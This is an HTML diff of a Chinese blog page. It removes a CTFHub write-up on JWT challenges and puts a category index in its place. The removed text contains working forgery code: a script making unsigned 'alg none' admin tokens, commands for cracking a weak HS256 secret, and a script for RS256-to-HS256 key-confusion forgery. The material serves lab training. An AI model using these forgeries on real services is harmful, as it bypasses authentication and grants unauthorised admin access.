@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">ctfhub-jwt | s1rius&#39;s blog</title>
+  <title itemprop="name">Category: 资源 | s1rius&#39;s blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -277,187 +277,105 @@
   </div>
 </header>
 
-      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+      
 <div class="pattern-center-blank"></div>
-
-  <div class="pattern-center single-center">
-    <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://api.yimian.xyz/img?type=moe);" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://api.yimian.xyz/img?type=moe">
-    </div>
-    <header class="pattern-header single-header">
-      <h1 class="entry-title">
-      ctfhub-jwt</h1>
-      <p class="entry-census">
-        <span>
-          <a href="cns1rius.github.io">
-            <img src="/img/custom/avatar.jpg">
-          </a>
-        </span>
-        <span>
-          <a href="cns1rius.github.io">s1rius</a>
-        </span>
-        <span class="bull">
-        ·</span>
-        2022-8-29<span class="bull">
-        ·</span>
-      <span id="busuanzi_value_page_pv"></span>次阅读</p>
-    </header>
+<div class="pattern-center ">
+  <div class="pattern-attachment-img">
+    <img data-src="资源.img" class="lazyload" onerror="imgError(this,3)" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;">
   </div>
-
+  <header class="pattern-header ">
+    <h1 class="cat-title">资源.zh</h1>
+    <span class="cat-des">
+      <p>资源.en</p>
+    </span>
+  </header>
+</div>
 <div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
-      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
-        <div class="toc"></div>
-        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
-        
-        <div class="entry-content">
-          <h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>题目附件：<a href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob" target="_blank" rel="noopener">jwt基础知识</a></p>
-<p>flag在下面</p>
-<p>需要了解一下jwt组成部分</p>
-<h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><p>随便输个</p>
-<p>进去查消息头</p>
-<p>然后在</p>
-<p><a href="https://jwt.io/" target="_blank" rel="noopener">jwt.io</a></p>
-<p>decode    一共两部分ag是另一半<br><img src="https://img-blog.csdnimg.cn/a4b0f89e87f84f8aa21b3071ec99c066.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
-<h1 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">algorithm=<span class="string">"none"</span></span><br><span class="line">payload = &#123;</span><br><span class="line">  <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"password"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"role"</span>:<span class="string">"admin"</span></span><br><span class="line">  &#125;</span><br><span class="line">key = <span class="string">""</span></span><br><span class="line">encoded = jwt.encode(payload,key,algorithm)</span><br><span class="line">print(encoded)</span><br></pre></td></tr></table></figure>
-<p>jwt的签名可以为无</p>
-<blockquote>
-<p>今天写这个脚本的时候命名为jwt.py</p>
-<p>结果报错 但是系统环境运行正常</p>
-<p>才知道是文件名的事</p>
-<p>import jwt 他先自己引用自己了</p>
-</blockquote>
-<p>抓包</p>
-<p>把cookie里的token改为这脚本的运行结果</p>
-<h1 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h1><p>需要用到<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">jwt-cracker</a></p>
-<p>依次执行即可</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/brendan-rius/c-jwt-cracker</span><br><span class="line">./c-jwt-cracker</span><br><span class="line">make</span><br><span class="line">./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.w4i8KWRWmY_xTYtRnFZnp5vLIxPG2abCly6lW6QxTKs</span><br></pre></td></tr></table></figure>
-<p>然后得出该jwt密钥</p>
-<p>然后放之前那个网站</p>
-<p>改role为admin</p>
-<p><img src="https://img-blog.csdnimg.cn/7fbb4534fca24281881a5aea1cba74ab.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/0c56be41283b43b7ae7bb6c95aac0ae6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述">返回提交token<br><img src="https://img-blog.csdnimg.cn/5da55fadcc664157bfd8481e7bd0d57d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
-<h1 id="修改签名算法"><a href="#修改签名算法" class="headerlink" title="修改签名算法"></a>修改签名算法</h1><p>把cookie清空后提交用户名密码</p>
-<p>得到一串jwt</p>
-<p>丢进<br><img src="https://img-blog.csdnimg.cn/f12a54b8f88848f49959045582a95cb7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>发现是RS256编码（不对称式编码）</p>
-<p>需要改为对称式编码</p>
-<p>如HS256</p>
-<p>题目中给了public key</p>
-<p>用PUBLIC_KEY采用HS256进行加密payload构造token</p>
-<p>借用<a href="https://blog.csdn.net/loseheart157" target="_blank" rel="noopener">大神h0ld1rs</a>的脚本</p>
-<blockquote>
-<p>无签名那段脚本</p>
-<p>是勉勉强强写出来的</p>
-<p>这题就先用大神的脚本吧</p>
-<p>我太菜了</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=GBK</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">'publickey.pem'</span>)<span class="comment">#需要将文中的publickey下载	与脚本同目录</span></span><br><span class="line">key = file.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Paste your header and payload here</span></span><br><span class="line">header = <span class="string">'&#123;"typ": "JWT", "alg": "HS256"&#125;'</span></span><br><span class="line">payload = <span class="string">'&#123;"username": "admin", "role": "admin"&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating encoded header</span></span><br><span class="line">encodeHBytes = base64.urlsafe_b64encode(header.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">encodeHeader = str(encodeHBytes, <span class="string">"utf-8"</span>).rstrip(<span class="string">"="</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating encoded payload</span></span><br><span class="line">encodePBytes = base64.urlsafe_b64encode(payload.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">encodePayload = str(encodePBytes, <span class="string">"utf-8"</span>).rstrip(<span class="string">"="</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Concatenating header and payload</span></span><br><span class="line">token = (encodeHeader + <span class="string">"."</span> + encodePayload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating signature</span></span><br><span class="line">sig = base64.urlsafe_b64encode(hmac.new(bytes(key, <span class="string">"UTF-8"</span>), token.encode(<span class="string">"utf-8"</span>), hashlib.sha256).digest()).decode(<span class="string">"UTF-8"</span>).rstrip(<span class="string">"="</span>)</span><br><span class="line"></span><br><span class="line">print(token + <span class="string">"."</span> + sig)</span><br></pre></td></tr></table></figure>
-<p>运行后把token返回去验证</p>
-<p>成功</p>
-<p><img src="https://img-blog.csdnimg.cn/169a632c18eb4233a605602f6f6b9cde.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><img src="https://img-blog.csdnimg.cn/cbb9f91b8d69482283ce362d1407284f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
-
-        </div>
-        <!-- .entry-content -->
-        <div class="single-reward">
-          <div class="reward-open">赏
-            <div class="reward-main">
-              <ul class="reward-row">
-                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0null"></li>
-                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/donate/WeChanQR.jpg"></li>
-              </ul>
-            </div>
-          </div>
-        </div>
-        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
-        <footer class="post-footer">
-          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
-          <div class="post-tags">
-          </div>
-          <div class="post-share">
-            <div class="social-share sharehidden share-component"></div>
-            <i class="iconfont show-share icon-forward"></i>
-          </div>
-        </footer><!-- .entry-footer -->
-      </article>
-      <!-- #post-## -->
-      <div class="toc" style="background: none;"></div>
-      <section class="post-squares nextprev">
-        
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2022/08/linux动态加载/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://api.yimian.xyz/img?type=moe" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://api.yimian.xyz/img?type=moe">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                linux动态加载</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
-        
-          
-            <div class="post-nepre half next">
-          
-            <a href="/2022/08/git/" rel="next">
-              <div class="background">
-                <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://api.yimian.xyz/img?type=moe" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://api.yimian.xyz/img?type=moe">
-              </div>
-              <span class="label">
-              Next Post</span>
-              <div class="info">
-                <h3>
-                git命令</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
-      </section>
       
-<div id="vcomments"></div>
-<script>
-  window.onload = function(){
-      var valine = new Valine();
-      valine.init({
-        el: '#vcomments',
-        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
-        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
-        path: window.location.pathname,
-        placeholder: "你是我一生只会遇见一次的惊喜 ..."
-      })
-  }
-</script>
-
-
-
-
-      <section class="author-profile">
-        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
-          <a href="cns1rius.github.io" class="profile gravatar"><img src="/img/custom/avatar.jpg" itemprop="image" alt="s1rius" height="70" width="70"></a>
-          <div class="meta">
-            <span class="title">Author</span>
-            <h3 itemprop="name">
-            <a href="cns1rius.github.io" itemprop="url" rel="author">s1rius</a>
-            </h3>
-          </div>
+  <!-- 首页默认取最最新文章集 -->
+  
+    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
+  <div class="post-entry">
+    <div class="feature">
+      <a href="/2022/08/Visual Studio 2022界面美化教程/">
+        <div class="overlay">
+          <i class="iconfont icon-text">
+          </i>
         </div>
-        <hr>
-        <p><i class="iconfont icon-write"></i></p>
-      </section>
-    </main><!-- #main -->
-  </div><!-- #primary -->
+        <img width="150" height="150" src="https://api.yimian.xyz/img?type=moe" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
+      </a>
+    </div>
+    <h1 class="entry-title">
+    <a href="/2022/08/Visual Studio 2022界面美化教程/">
+    Visual Studio 2022界面美化教程</a>
+    </h1>
+    <div class="p-time">
+      <i class="iconfont icon-time">
+      </i>
+    2022-8-29</div>
+    <p>
+    </p>
+    <footer class="entry-footer">
+      <div class="post-more">
+        <a href="/2022/08/Visual Studio 2022界面美化教程/">
+          <i class="iconfont icon-caidan">
+          </i>
+        </a>
+      </div>
+    </footer>
+  </div>
+  <hr>
+</article>
+  
+
+
+      <div class="clearer">
+      </div>
+    </main>
+    <!--  -->
+    
+  </div>
 </div>
 
+<!-- 
+  
+    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
+  <div class="post-entry">
+    <div class="feature">
+      <a href="/2022/08/Visual Studio 2022界面美化教程/">
+        <div class="overlay">
+          <i class="iconfont icon-text">
+          </i>
+        </div>
+        <img width="150" height="150" src="https://api.yimian.xyz/img?type=moe" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
+      </a>
+    </div>
+    <h1 class="entry-title">
+    <a href="/2022/08/Visual Studio 2022界面美化教程/">
+    Visual Studio 2022界面美化教程</a>
+    </h1>
+    <div class="p-time">
+      <i class="iconfont icon-time">
+      </i>
+    2022-8-29</div>
+    <p>
+    </p>
+    <footer class="entry-footer">
+      <div class="post-more">
+        <a href="/2022/08/Visual Studio 2022界面美化教程/">
+          <i class="iconfont icon-caidan">
+          </i>
+        </a>
+      </div>
+    </footer>
+  </div>
+  <hr>
+</article>
+  
 
-
+ -->
     </div>    
     <div class="ins-search">
     <div class="ins-search-mask"></div>
